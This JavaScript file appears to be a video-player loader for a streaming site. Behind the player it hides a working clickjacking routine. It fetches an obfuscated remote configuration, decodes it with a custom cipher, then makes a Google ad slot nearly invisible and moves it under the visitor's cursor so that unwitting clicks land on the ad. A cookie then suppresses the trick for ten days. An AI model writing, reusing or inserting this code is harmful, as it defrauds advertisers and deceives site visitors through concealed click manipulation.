let monitorTracker = null;
let h12_canTrack = 0;
let h12_div = null;
let bannerAds = null;
let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
let htmlCode = '' +
    '<style>.loader-pkz{position:relative;top:50%;margin:0 auto;margin-top:-120px;border:16px solid #f3f3f3;border-radius:50%;border-top:16px solid #3498db;width:120px;height:120px;-webkit-animation:spin 2s linear infinite;animation:spin 2s linear infinite}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg)}}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>' +
    '<div id="player'+ uniqueID +'" style="z-index:88000;position:fixed;width:100%;height:100%;overflow:hidden;background-color: rgba(52, 152, 219, 0.5);top:0;left:0;"><div class="loader-pkz"></div></div>' +
    '<iframe frameborder="0" scrolling="0" id="_z0s59a_obj'+ uniqueID +'" type="text/html" style="background:#2f2f2f;z-index:80000;position:fixed;width:100%;height:100%;overflow:hidden;top:0;left:0;" allowFullScreen></iframe>';

var _w = window.innerWidth;
var _width = 768;
var _height = 90;

if (_w >= 1600) { _width = 970; _height = 250; }
else if (_w < 1600 && _w >= 800) { _width = 728; _height = 90; }
else if (_w < 800 && _w >= 640) { _width = 468; _height = 60; }
else if (_w < 640 && _w >= 300) { _width = 300; _height = 250; }
else { _width = 120; _height = 60; }
let pointerTracker = function(e){
    let out = {x:0, y:0};
    if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
        let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
        out.x = touch.pageX;
        out.y = touch.pageY;
    } else if (e.type == 'mousedown' || e.type == 'mouseup' || e.type == 'mousemove' || e.type == 'mouseover'|| e.type=='mouseout' || e.type=='mouseenter' || e.type=='mouseleave') {
        out.x = e.pageX;
        out.y = e.pageY;
    }
    return out;
};

function randomizeArray(a) {
    let j, x, i;
    for (i = a.length - 1; i > 0; i--) {
        j = Math.floor(Math.random() * (i + 1));
        x = a[i];
        a[i] = a[j];
        a[j] = x;
    }
    return a;
}
function setCookie(strCookie, strValor, lngHoras) {
    let dtmData = new Date();
    let strExpires = null;
    if (lngHoras) {
        dtmData.setTime(dtmData.getTime() + (lngHoras * 60 * 1000 * 60));
        strExpires = "; expires=" + dtmData.toGMTString();
    } else {
        strExpires = "";
    }
    document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
}
function getCookie(strCookie) {
    let strNomeIgual = strCookie + "=";
    let arrCookies = document.cookie.split(';');
    for (let i = 0; i < arrCookies.length; i++) {
        let strValorCookie = arrCookies[i];
        while (strValorCookie.charAt(0) == ' ') {
            strValorCookie = strValorCookie.substring(1, strValorCookie.length);
        }
        if (strValorCookie.indexOf(strNomeIgual) == 0) {
            return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
        }
    }
    return null;
}
function setClick(){
    setCookie("_sad26a9szSas",  "1", 24 * 10);
    setTimeout(revertDiv,0);
    document.activeElement.blur();
}
function startTracker() {
    monitorTracker = setInterval(function(){
        let elem = document.activeElement;
        if(elem && elem.tagName == 'IFRAME'){
            setTimeout(setClick,0);
            setTimeout(revertDiv,1000);
            clearInterval(monitorTracker);
        }
    }, 100);
}
function revertDiv() {
    h12_canTrack = 0;
    $("#" + h12_div).css("z-index", "").css("top", "").css("left", "").css("position", "").css("pointer-events", "none");
    $("#player" + uniqueID).hide();
    $("#player" + uniqueID).css("display","none");
}
function startScript(){
    h12_div = 'div-gpt-ad-1576258168872-0';
    bannerAds = $("#" + h12_div);

    $(document).on('mousemove touchstart', function(e){
        let tracker = pointerTracker(e);
        if (h12_canTrack == 1) {
            let _w = (_width / 1.8);
            let _h = (_height / 3.1);
            let _w2 = (_width / 2);
            let _h2 = (_height / 3.3);
            $("#" + h12_div).css({
                left:  tracker.x - Math.floor(Math.random()*(_w-_w2+1)+_w2),
                top:   tracker.y - Math.floor(Math.random()*(_h-_h2+1)+_h2)
            });
        }
    });

    bannerAds.css("pointer-events", "none").click(function(){setTimeout(revertDiv, 0)});
    $('#_z0s59a_obj'+ uniqueID).attr("src", getCookie("_iplz_url_video")).on('load', function() {
        if(getCookie("_sad26a9szSas") == null){
            followDiv();
            setTimeout(function (){$("#player" + uniqueID).css("background", "none").html('')}, 3000);
        } else {
            setTimeout(function (){$("#player" + uniqueID).hide().css("display", "none")}, 3000);
        }
    });
}
function followDiv() {
    h12_canTrack = 1;
    startTracker();
    bannerAds.css("z-index", "90000").css("position", "fixed").css("opacity", "0.0001").css("pointer-events", "");
}
function decrypt(s1, id) {
    s1 = atob(s1);
    var result = '';
    var xx2 = s1.charAt(0);
    xx2 = xx2.charCodeAt(0) - 65;
    s1 = s1.substr(1);
    while(s1.length > 0) {

        result = result + String.fromCharCode(
            (
                s1.charAt(0).charCodeAt(0) - 65
            )
            * 25 +
            (
                s1.charAt(1).charCodeAt(0) - 65
            )
            - xx2 - id
        );

        s1 = s1.substr(2);

    }
    return result;
}

if(getCookie("_iplz_url_video") !== null) {
    fetch('https://www.iplezier.site/assets/js/c/rc.json?ver=' + $.now())
        .then(function (response) {
            return response.text();
        })
        .then(function (body) {
            let jsonResponse = JSON.parse(decrypt(body, 1247));
            if (jsonResponse.redecanais === true) {
                $("body").css("overflow", "hidden").css("width", "100%").append(htmlCode);
                setTimeout(startScript, 0);
            }
        });
}
